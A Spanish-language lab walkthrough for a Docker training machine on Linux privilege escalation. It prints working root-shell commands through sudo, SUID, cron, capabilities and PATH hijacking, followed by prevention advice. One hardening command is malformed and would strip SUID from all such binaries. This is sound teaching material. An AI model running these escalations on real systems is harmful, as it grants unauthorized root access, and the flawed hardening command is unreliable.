<li><a href="#_3_cron_ejecutando_script_editable_2">3. Cron ejecutando script editable</a></li>
<li><a href="#_4_capacidades_en_binario_2">4. Capacidades en binario</a></li>
<li><a href="#_5_path_hijacking_2">5. PATH Hijacking</a></li>
</ul>
</li>
<li><a href="#_cómo_prevenir">¿Cómo prevenir?</a>
<ul class="sectlevel2">
<li><a href="#_1_archivo_sudoers_3">1. Archivo sudoers</a></li>
<li><a href="#_2_binario_suid_3">2. Binario SUID</a></li>
<li><a href="#_3_cronjob">3. Cronjob</a></li>
<li><a href="#_4_capabilities">4. Capabilities</a></li>
<li><a href="#_5_path_hijacking_3">5. PATH Hijacking</a></li>
<li><a href="#_otros_vectores_2">Otros vectores</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="content">
<div class="sect1">
<h2 id="_despliegue_de_la_máquina">Despliegue de la máquina</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Sería conveniente utilizar una distribución Linux, es recomendable usar Kali Linux.</p>
</div>
<div class="paragraph">
<p>Como requisito, necesitaremos tener instalado docker y docker-compose.</p>
</div>
<div class="paragraph">
<p>Podemos ver como instalar docker para varias distribuciones de linux &#8594; <a href="https://docs.docker.com/engine/install/">Instalar Docker</a></p>
</div>
<div class="paragraph">
<p>Podemos ver como instalar docker-compose para varias distribuciones de linux &#8594; <a href="https://docs.docker.com/compose/install/linux/">Instalar Docker-Compose</a></p>
</div>
<div class="paragraph">
<p>Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como una pirámide en la página. Después deberemos meter en un directorio tanto el auto_deploy.sh como el archivo de envidia.tar, y ejecutar los siguientes comandos.</p>
</div>
<div class="paragraph">
<p>(Si el auto_deploy no tiene permisos se los damos mediante <strong>chmod +x</strong>).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo bash auto_deploy.sh envidia.tar</code></pre>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_escalada_de_privilegios">Escalada de privilegios</h2>
<div class="sectionbody">
<div class="paragraph">
<p>La escalada de privilegios es el uso de una falla de software, una vulnerabilidad, un defecto de diseño, una falla de configuración o un control de acceso en un sistema operativo o aplicación para obtener acceso no autorizado a recursos que normalmente están restringidos para una aplicación o usuario.</p>
</div>
<div class="paragraph">
<p>Como resultado, la aplicación o el usuario obtienen más privilegios de los que fueron diseñados por el desarrollador o administrador del sistema, lo que permite a los atacantes acceder a información confidencial, instalar malware y lanzar otros ciberataques.</p>
</div>
<div class="sect2">
<h3 id="_tipos_de_escalada">Tipos de escalada</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p><strong>Escalada de privilegios vertical</strong> &#8594; El atacante comienza con una cuenta de bajo nivel (por ejemplo, un usuario estándar) y busca elevar sus privilegios para obtener acceso administrativo (como root en Linux o administrador en Windows). El objetivos comunes es acceder a datos sensibles, instalar malware, ejecutar comandos como administrador.</p>
</li>
<li>
<p><strong>Escalada de privilegios horizontal</strong> &#8594; El atacante ya posee una cuenta privilegiada, pero intenta acceder a recursos o funciones que están fuera del alcance original de ese usuario. En aplicaciones web implica acceder a cuentas de otros usuarios, como acceder al panel de administrador desde una cuenta normal.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_vectores_de_ataque">Vectores de ataque</h3>
<div class="paragraph">
<p>Nosostros nos vamos a centrar en la escalada de privilegios vertical.</p>
</div>
<div class="sect3">
<h4 id="_1_archivo_sudoers">1. Archivo sudoers</h4>
<div class="paragraph">
<p>El archivo Sudoers es el archivo en el que se almacenan los usuarios y grupos que tienen privilegios root para ejecutar algunas o todas las órdenes como root o otro usuario, este archivo se encuentra en /etc. La sintaxis es la siguiente para el permiso root por defecto <strong>"root ALL = (ALL: ALL) ALL"</strong>, aunque también hay una opción TAG disponible que es opcional.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/Sintaxis.png" alt="Sintaxis sudoers">
</div>
</div>
<div class="paragraph">
<p>Por lo que en este archivo se puede dar privilegios root a los comandos binarios, poniendo en la configuración el binario en concreto <strong>"NOPASSWD : /usr/bin/find"</strong> este tipo de autorización lleva a una elevación de privilegios para acceder a root, además la etiqueta NOPASSWD significa que no se pedirá ninguna contraseña para la autenticación al ejecutar el comando sudo -l.</p>
</div>
</div>
<div class="sect3">
<h4 id="_2_binario_suid">2. Binario SUID</h4>
<div class="paragraph">
<p>El bit SUID (Set User ID) se utiliza en archivos ejecutables para otorgar al usuario que los ejecute los privilegios del propietario del archivo (generalmente root). Esto es necesario en algunos binarios, como /usr/bin/passwd, para realizar acciones que requieren permisos elevados.</p>
</div>
<div class="paragraph">
<p>Sin embargo, si el binario con el bit SUID activado es vulnerable, un atacante puede explotarlo para ejecutar comandos como root. Este tipo de vulnerabilidad puede ser detectado fácilmente usando herramientas como find para localizar archivos con el bit SUID activado.</p>
</div>
</div>
<div class="sect3">
<h4 id="_3_cron_ejecutando_script_editable">3. Cron ejecutando script editable</h4>
<div class="paragraph">
<p>Primeramente debemos entender crontab, hay dos tipos:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Crontab del sistema</strong> &#8594; Se encuentra en <strong>/etc/crontab</strong>, principalmente sirve para programar tareas a nivel global (para todos los usuarios). Además, puede contener scripts que se ejecutan con privilegios elevados.</p>
</li>
<li>
<p><strong>Crontab de usuario</strong> &#8594; Se crea con el comando <strong>crontab -e</strong>, por lo que las tareas solo afectan al usuario que las crea y se almacenan en /var/spool/cron/crontabs, pero los usuarios estándar no pueden ver ni listar estos archivos directamente. También se conocen como “cron jobs ocultos”.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Por lo que un usuario malintencionado podría modificar un script que se ejecuta automáticamente como root desde /etc/crontab si tiene permisos de escritura sobre ese archivo o script, logrando así ejecutar código malicioso con privilegios elevados.</p>
</div>
<div class="paragraph">
<p>Se puede ver el contenido en <strong>cat /etc/crontab</strong>. Esto es útil para identificar scripts vulnerables que podrían ser aprovechados para una escalada de privilegios.</p>
</div>
</div>
<div class="sect3">
<h4 id="_4_capacidades_en_binario">4. Capacidades en binario</h4>
<div class="paragraph">
<p>Antes de las capabilities, los procesos en Linux solo se diferenciaban entre privilegiados (root) y no privilegiados (usuarios normales). Con las capabilities, los privilegios de root se dividen en pequeños permisos, permitiendo que los procesos tengan solo los permisos necesarios para realizar tareas específicas, mejorando así la seguridad.</p>
</div>
<div class="paragraph">
<p>La diferencia entre SUID y capabilities es:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>SUID (Set User ID)</strong> &#8594; Permite a un usuario ejecutar un archivo con los permisos de su propietario (generalmente root). Es fácil de detectar y puede ser peligroso si el binario es vulnerable.</p>
</li>
<li>
<p><strong>Capabilities</strong> &#8594; Asignan permisos más específicos a los procesos. Por ejemplo, en lugar de dar acceso total a root, se puede permitir que un binario escuche en un puerto sin ser root, utilizando capacidades como <strong>CAP_NET_BIND_SERVICE</strong>.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Los valores de las capabilites son:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>P (Permitted)</strong> &#8594; Marca la capability como habilitada. Es decir, ahora esta podrá tener el valor de Effective o Inheritable.</p>
</li>
<li>
<p><strong>E (Effective)</strong> &#8594; Aplica la capability al proceso definido.</p>
</li>
<li>
<p><strong>I (Inheritable)</strong> &#8594; La pueden heredar los subprocesos.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Las capabilities permiten dividir los privilegios de root en partes más pequeñas, otorgando solo los permisos necesarios. Esto mejora la seguridad, ya que los procesos reciben solo lo que necesitan para ejecutar tareas específicas. Pero si una capability se asigna a un binario de manera inapropiada, puede permitir a los usuarios ejecutar acciones que deberían estar restringidas.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/Capabilities.png" alt="Capabilities">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_5_path_hijacking">5. PATH Hijacking</h4>
<div class="paragraph">
<p>El PATH Hijacking se produce cuando un script que se ejecuta con privilegios elevados (como root) llama a comandos sin especificar una ruta absoluta. Si un atacante puede manipular el entorno PATH, podría colocar un ejecutable malicioso en una ruta que aparezca antes en el orden de búsqueda del PATH. De esta manera, el sistema ejecutaría el archivo malicioso en lugar del ejecutable legítimo, lo que permitiría al atacante ejecutar código malicioso con privilegios elevados.</p>
</div>
</div>
<div class="sect3">
<h4 id="_otros_vectores">Otros vectores</h4>
<div class="paragraph">
<p><strong>NFS</strong> permite compartir directorios y archivos entre sistemas a través de una red. Sin embargo, una configuración incorrecta puede introducir vulnerabilidades críticas que faciliten la escalada de privilegios.</p>
</div>
<div class="paragraph">
<p>La opción <strong>no_root_squash</strong> en la configuración de NFS permite que el usuario root en el cliente mantenga privilegios de root en el servidor al acceder a los recursos compartidos. Esto puede ser explotado por un atacante para crear archivos con permisos SUID en el servidor, facilitando la obtención de una shell con privilegios elevados. Por defecto, NFS utiliza root_squash para mapear al usuario root del cliente a un usuario anónimo sin privilegios, como nfsnobody, mitigando este riesgo.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_solucionar_la_máquina">Solucionar la máquina</h2>
<div class="sectionbody">
<div class="paragraph">
<p>En esta guía nos centraremos en la escalada de privilegios vertical, aprendiendo cómo elevar los privilegios desde un usuario estándar en distintos contextos. En esta máquina, simularemos que ya hemos obtenido las credenciales de un usuario. Es importante mencionar que existen muchas técnicas para escalar privilegios, pero aquí veremos las más comunes.</p>
</div>
<div class="paragraph">
<p>Además, a lo largo de esta máquina veremos vulnerabilidades de binarios asi que recomiendo este repositorio: <a href="https://gtfobins.github.io/">GTFOBins</a></p>
</div>
<div class="paragraph">
<p>Debemos tener en cuenta que hay tres servicios activos:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Apache</strong> → Muestra archivos del servidor FTP: (<a href="http://dante.172.35.0.2.nip.io" class="bare">http://dante.172.35.0.2.nip.io</a>)</p>
</li>
<li>
<p><strong>FTP</strong> → Permite subir archivos autenticándonos como usuario: (ftpuser:ftp123)</p>
</li>
<li>
<p><strong>SSH</strong> → Proporciona acceso al sistema para gestión remota: (user:password)</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Dado que ya disponemos de las credenciales, nos conectamos al contenedor SSH.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ ssh user@172.35.0.4 -p 22</code></pre>
</div>
</div>
<div class="paragraph">
<p>Si nos sale un error ponemos el comando que nos indica:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/SSHerror.png" alt="SSHerror">
</div>
</div>
<div class="sect2">
<h3 id="_1_archivo_sudoers_2">1. Archivo sudoers</h3>
<div class="sect3">
<h4 id="_reconocimiento">Reconocimiento</h4>
<div class="paragraph">
<p>Una vez dentro como usuario, deberemos verificar si tenemos privilegios sobre algún comando específico, para ello usamos el siguiente comando:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo -l</code></pre>
</div>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>-l</strong> &#8594; Lista los comandos específicos a los que el usuario tiene privilegios.</p>
</li>
</ul>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/sudoers/sudoL.png" alt="comando sudo -l">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_escalada">Escalada</h4>
<div class="paragraph">
<p>Cómo podemos ver tenemos permisos en los binarios de less y awk. No necesitamos conocer cómo funciona el comando, sino cómo vulnerarlo, por lo que podemos buscarlo en GTFOBins,:</p>
</div>
<div class="sect4">
<h5 id="_less">less</h5>
<div class="paragraph">
<p>Buscnado en GTFOBins, en la sección de <strong>Sudo</strong> encontraremos cómo vulnerarlo &#8594; <a href="https://gtfobins.github.io/gtfobins/less/">GTFOBins less</a></p>
</div>
<div class="paragraph">
<p>Entonces, como este comando usa root, lo que necesitaremos es crear una shell dentro de él, entonces los comandos que ejecute esa shell serán de administrador y habremos escalado:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo less /etc/profile
$ !/bin/sh</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/sudoers/less1.png" alt="less">
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/sudoers/less2.png" alt="escalar con less">
</div>
</div>
</div>
<div class="sect4">
<h5 id="_awk">awk</h5>
<div class="paragraph">
<p>Hacemos el mismo proceso anterior, buscando en GTFOBins &#8594; <a href="https://gtfobins.github.io/gtfobins/awk/">GTFOBins awk</a></p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ sudo awk 'BEGIN {system("/bin/sh")}'</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/sudoers/awk.png" alt="awk">
</div>
</div>
<div class="paragraph">
<p>De esta forma podemos escalar de privilegios si tenemos permisos de root en algunos comandos.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_2_binario_suid_2">2. Binario SUID</h3>
<div class="sect3">
<h4 id="_reconocimiento_2">Reconocimiento</h4>
<div class="paragraph">
<p>Primeramente vamos a buscar los binarios SUID que hay en el sistema:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/suid/reconfind.png" alt="reconocimeineto">
</div>
</div>
<div class="paragraph">
<p>Podemos ver que hay una ruta que es distinta a todas las otras, podemos ver su código para entender mejor que ocurre si lo ejecutamos.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/suid/codigo.png" alt="ver codigo">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_escalada_2">Escalada</h4>
<div class="paragraph">
<p>Es un código escrito en python3 que inicia una shell, cómo tiene el bit SUID, abrerá dicha shell como root. Por lo que nos disponemos a ejecutarlo:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/suid/root.png" alt="escalar root">
</div>
</div>
<div class="paragraph">
<p>Y cómo podemos ver somos root, esto es muy útil conocerlo, ya que si un servicio con privilegios de root le diese el bit SUID a un archivo, este se ejecutaría con permisos de root, lo cual lo vamos a ver en el siguiente vector.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_3_cron_ejecutando_script_editable_2">3. Cron ejecutando script editable</h3>
<div class="sect3">
<h4 id="_reconocimiento_3">Reconocimiento</h4>
<div class="paragraph">
<p>Para este caso, deberemos comprobar primeramente qué se está ejecutando con crontab, de esta forma podemos ver si hay algún archivo vulnerable. Por lo que ejecutamos el siguiente comando para verlo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ cat /etc/crontab</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/cronjob.png" alt="cronjob">
</div>
</div>
<div class="paragraph">
<p>En este caso, no aparece ningún archivo que se esté ejecutando, por lo que miramos en otras rutas:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ ls -l /etc/cron*</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/cronlist.png" alt="lista cron">
</div>
</div>
<div class="paragraph">
<p>Podemos ver que hay uno que se ha ejecutado recientemente, y podemos leerlo, posiblemente tenga la ruta del script que ejecute:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/horacron.png" alt="hora cron">
</div>
</div>
<div class="paragraph">
<p>El contenido nos muestra que cada minuto ejecuta ese script y lo almacena en un log, por lo que podemos ver los logs:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/horalogs.png" alt="logs">
</div>
</div>
<div class="paragraph">
<p>Por lo que este script da la hora cada minuto, entonces vamos a ver sus permisos y si podemos editarlo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ ls -la /usr/local/bin/hora.sh</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/hora1.png" alt="hora">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_escalada_3">Escalada</h4>
<div class="paragraph">
<p>Cómo tiene permisos de escritura para otros, podemos editarlo y sobrescribir en el archivo. Asi que vamos a ejecutar una shell como root creando en /tmp el archivo rootbash:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ echo '#!/bin/bash' &gt; /usr/local/bin/hora.sh
$ echo 'cp /bin/bash /tmp/rootbash' &gt;&gt; /usr/local/bin/hora.sh
$ echo 'chown root:root /tmp/rootbash' &gt;&gt; /usr/local/bin/hora.sh
$ echo 'chmod +s /tmp/rootbash' &gt;&gt; /usr/local/bin/hora.sh</code></pre>
</div>
</div>
<div class="paragraph">
<p>Este conjunto de comandos sobrescribe el script /usr/local/bin/hora.sh que será ejecutado automáticamente por cron con privilegios de root. El script copia el binario de bash a /tmp/rootbash, cambia su propietario a root y le aplica el bit SUID, lo que permite que cualquier usuario que lo ejecute obtenga una shell con privilegios de root, cómo hemos visto antes.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/horaeditar.png" alt="editar archivo">
</div>
</div>
<div class="paragraph">
<p>Una vez hecho esto, esperamos a que cronjob lo ejecute como root:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/cronjob/horaroot.png" alt="escalada root">
</div>
</div>
<div class="paragraph">
<p>De esta forma hemos visto como encontrar ejecutables vulnerables con cronjob, aunque hay herramientas que pueden facilitarnos el trabajo como:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="https://github.com/peass-ng/PEASS-ng/">LinPEAS</a></p>
</li>
<li>
<p><a href="https://github.com/DominicBreuker/pspy">pspy</a></p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Hay muchas formas de vulnerar cronjob mediante otros vectores, por lo que recomiendo mirar &#8594; <a href="https://juggernaut-sec.com/cron-jobs-lpe/">Escalada con Cronjob</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_4_capacidades_en_binario_2">4. Capacidades en binario</h3>
<div class="sect3">
<h4 id="_reconocimiento_4">Reconocimiento</h4>
<div class="paragraph">
<p>Deberemos conocer que paquetes tiene instalados el sistema, ya que puede tener lenguajes cómo python que nos pueden ayudar a escalar, por lo que buscamos entre todos hasta que encontremos alguno que nos interese:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ dpkg -l</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/dpkg.png" alt="dpkg">
</div>
</div>
<div class="paragraph">
<p>Cómo tiene python podemos hacer un sleep con este para ver el número de proceso es y ver sus capabilities:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ python3 -c 'import time; time.sleep(500)'</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/psaux.png" alt="psaux">
</div>
</div>
<div class="paragraph">
<p>Podemos ver que su PID es el 1022, para encontrar las capabilities podemos verlo en /proc, donde habrá varios números los cuales son los IDs de los procesos:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/pid.png" alt="pid">
</div>
</div>
<div class="paragraph">
<p>Para ver que capabilities tiene ese proceso ponemos el siguiente comando:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ cat /proc/(PID)/status | grep Cap</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/cap.png" alt="capabilities">
</div>
</div>
<div class="paragraph">
<p>Estos nos aparecerán en hexadecimal, para entenderlo podemos usar <strong>capsh</strong>, el cual podemos instalar en nuestro sistema y decodificar cada hexadecimal. En este caso solo tenemos tres números, pero antes de esto debemos entender las lineas:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">CapInh -&gt; Capabilities Inherentes (Inheritable)
CapPrm -&gt; Capabilities Permitidas (Permitted)
CapEff -&gt; Capabilities Efectivas (Effective)
CapBnd -&gt; Límite de Bound capabilities
CapAmb -&gt; Ambient capabilities</code></pre>
</div>
</div>
<div class="paragraph">
<p>En cuanto a los números tenemos:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/numeros.png" alt="numeros hex">
</div>
</div>
<div class="paragraph">
<p>El que nos interesa es <strong>CAP_SETUID</strong> que aparece en <strong>CapPrm</strong> y <strong>CapEff</strong>, esto significa que permite a un proceso cambiar su UID y, por lo tanto, escalar privilegios. Normalmente, solo el usuario root puede hacer esto, pero si un proceso tiene CAP_SETUID, puede cambiar a cualquier otro usuario, incluido root.</p>
</div>
</div>
<div class="sect3">
<h4 id="_escalada_4">Escalada</h4>
<div class="paragraph">
<p>Por lo que si nos vamos a GTFOBins y en la parte de Capabilities &#8594; <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">GTFOBins python</a>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></pre>
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/capabilities/root.png" alt="escalada root">
</div>
</div>
<div class="paragraph">
<p>Ajustando un poco el comando a python3 podremos escalar como root.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_5_path_hijacking_2">5. PATH Hijacking</h3>
<div class="sect3">
<h4 id="_reconocimiento_5">Reconocimiento:</h4>
<div class="paragraph">
<p>Primeramente podemos ver nuestro /home si hay algún script que utilice algún comando normal, como ls, head, etc. En nuestro caso tenemos uno que se llama top10.py, si lo inspeccionamos muestra los 10 primeros usuarios y tiene permisos de root ya que tiene el bit SUID:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/ejecucion.png" alt="ejecucion top10">
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/Top10.png" alt="Top10">
</div>
</div>
<div class="paragraph">
<p>Cómo ejecuta head como root, debe de obtener su función de $PATH:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/path.png" alt="echo $path">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_escalada_5">Escalada</h4>
<div class="paragraph">
<p>Por lo que nosotros vamos a cambiar el path para que primero mire donde estamos y crearemos un script que nos de una shell como root.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/cambiarpath.png" alt="cambiar path">
</div>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/head.png" alt="crear head">
</div>
</div>
<div class="paragraph">
<p>Una vez hecho ejecutamos el programa:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="assets/path/root.png" alt="escalar root">
</div>
</div>
</div>
<div class="sect3">
<h4 id="_aclaración">Aclaración</h4>
<div class="paragraph">
<p>Cómo hemos visto en este último, el código del programa estaba en C, si hubiese estado en Python o Bash, no hubiese funcionado el PATH hijacking. Esto es porque el bit SUID solo funciona con binarios compilados (como los hechos en C) porque el sistema los ejecuta directamente y respeta el privilegio del propietario (por ejemplo, root). En cambio, los scripts como Bash o Python son interpretados, y el sistema lanza el intérprete (no el script) sin aplicar el SUID, por seguridad. Así se evita que scripts fácilmente modificables obtengan privilegios elevados.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_cómo_prevenir">¿Cómo prevenir?</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_archivo_sudoers_3">1. Archivo sudoers</h3>
<div class="ulist">
<ul>
<li>
<p><strong>Revisar permisos</strong> &#8594; Utilizar <strong>sudo -l</strong> para listar los comandos que un usuario puede ejecutar con sudo. De esta forma nos aseguramos de que solo se permitan los comandos necesarios.</p>
</li>
<li>
<p><strong>Evitar NOPASSWD innecesario</strong> &#8594; No otorgar la opción <strong>NOPASSWD</strong> a menos que sea absolutamente necesario, ya que permite ejecutar comandos sin autenticación adicional.</p>
</li>
<li>
<p><strong>Especificar rutas completas</strong> &#8594; En el archivo sudoers es importante definir las rutas completas de los comandos permitidos para evitar que se ejecuten versiones maliciosas ubicadas en otras rutas.</p>
</li>
<li>
<p><strong>Uso de visudo</strong> &#8594; Para editar el archivo <strong>sudoers</strong> se utiliza visudo debido a que la sintaxis incorrecta puede dejarlo con un sistema roto donde es imposible obtener privilegios elevados.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_2_binario_suid_3">2. Binario SUID</h3>
<div class="ulist">
<ul>
<li>
<p><strong>Eliminar permisos SUID y SGID innecesarios:</strong></p>
</li>
</ul>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ find / -perm -4000 -o -perm -2000 -type f -exec chmod u-s,g-s {}</code></pre>
</div>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Revisar periódicamente archivos con permisos elevados:</strong></p>
</li>
</ul>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ find / -perm -4000 -o -perm -2000 -type f 2&gt;/dev/null</code></pre>
</div>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Usar herramientas</strong> &#8594; Implementar herramientas de monitoreo como AuditD y SELinux.</p>
</li>
<li>
<p><strong>Aplicar el principio de privilegio mínimo</strong> &#8594; Evitar que usuarios no administradores tengan acceso a binarios sensibles.</p>
</li>
<li>
<p><strong>Habilitar autenticación multifactor y segmentación de red para minimizar impacto en caso de explotación.</strong></p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_3_cronjob">3. Cronjob</h3>
<div class="ulist">
<ul>
<li>
<p><strong>Revisar cronjobs</strong> &#8594; Auditar las tareas programadas en /etc/crontab, /etc/cron.d/, y los crontabs de usuarios para identificar posibles riesgos.</p>
</li>
<li>
<p><strong>Restringir permisos de scripts</strong> &#8594; Tenemos que verificar que los scripts ejecutados por cronjobs no sean modificables por usuarios sin privilegios.</p>
</li>
<li>
<p><strong>Evitar ejecutar scripts en directorios temporales</strong> &#8594; No se recomiendan tareas que ejecuten scripts ubicados en directorios como /tmp o /var/tmp.</p>
</li>
<li>
<p><strong>Especificar rutas absolutas</strong> &#8594; En los cronjobs, es importante utilizar rutas absolutas para los comandos y scripts ejecutados.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_4_capabilities">4. Capabilities</h3>
<div class="ulist">
<ul>
<li>
<p><strong>Enumerar capabilities asignadas:</strong></p>
</li>
</ul>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">$ getcap -r / 2&gt;/dev/null</code></pre>
</div>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Revocar capabilities innecesarias</strong> &#8594; Podemos usar <strong>setcap -r &lt;archivo&gt;</strong> para eliminar capabilities de binarios que no las requieran.</p>
</li>
<li>
<p><strong>Evitar asignar capabilities peligrosas</strong> &#8594; Por ejemplo, <strong>cap_setuid</strong> o <strong>cap_dac_read_search</strong> pueden ser riesgosas si se asignan a binarios accesibles por usuarios sin privilegios.</p>
</li>
<li>
<p><strong>Implementar políticas de seguridad</strong> &#8594; Se recomienda configurar mecanismos como <strong>AppArmor</strong> o <strong>SELinux</strong> para restringir el uso de capabilities.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_5_path_hijacking_3">5. PATH Hijacking</h3>
<div class="ulist">
<ul>
<li>
<p><strong>Usar rutas absolutas</strong> &#8594; En scripts y binarios, se debe especificar la ruta completa de los comandos, por ejemplo, /usr/bin/head en lugar de head.</p>
</li>
<li>
<p><strong>Validar y restringir el $PATH</strong> &#8594; Nos debemos asegurar de que el $PATH no incluya directorios escribibles por usuarios sin privilegios, como . o /tmp.</p>
</li>
<li>
<p><strong>Configurar secure_path en sudoers</strong> &#8594; Es importante definir un $PATH seguro para comandos ejecutados con sudo.</p>
</li>
<li>
<p><strong>Revisar scripts con privilegios</strong> &#8594; Podemos auditar scripts que se ejecutan con privilegios elevados para asegurarte de que no sean susceptibles a path hijacking.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_otros_vectores_2">Otros vectores</h3>
<div class="paragraph">
<p>Un caso no explorado es el de NFS, aquí veremos cómo mitigarlo:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><strong>Evitar no_root_squash</strong> &#8594; Nos debemos asegurar de que la opción <strong>no_root_squash</strong> no esté habilitada en el archivo <strong>/etc/exports</strong>. Esta opción permite que el usuario root en el cliente NFS tenga privilegios de root en el servidor, lo cual es peligroso.</p>
</li>
<li>
<p><strong>Utilizar root_squash</strong> &#8594; Esta opción mapea las solicitudes del usuario root del cliente a un usuario sin privilegios en el servidor, como <strong>nobody</strong>, reduciendo el riesgo de escalada de privilegios.</p>
</li>
<li>
<p><strong>Montar con opciones seguras</strong> &#8594; En el cliente, debemos montar los sistemas de archivos NFS con las opciones <strong>nosuid</strong> y <strong>nodev</strong> para evitar la ejecución de binarios con el bit SUID y el uso de dispositivos especiales.</p>
</li>
<li>
<p><strong>Restringir el acceso</strong> &#8594; Limitar el acceso a las exportaciones NFS especificando direcciones IP o rangos de red específicos en el archivo /etc/exports, evitando el uso de comodines como *.</p>
</li>
<li>
<p><strong>Auditoría regular</strong> &#8594; Debemos revisar periódicamente las configuraciones de NFS y los permisos de los archivos compartidos para detectar posibles vulnerabilidades.</p>
</li>
</ul>
</div>
<div class="listingblock">
<div class="content">
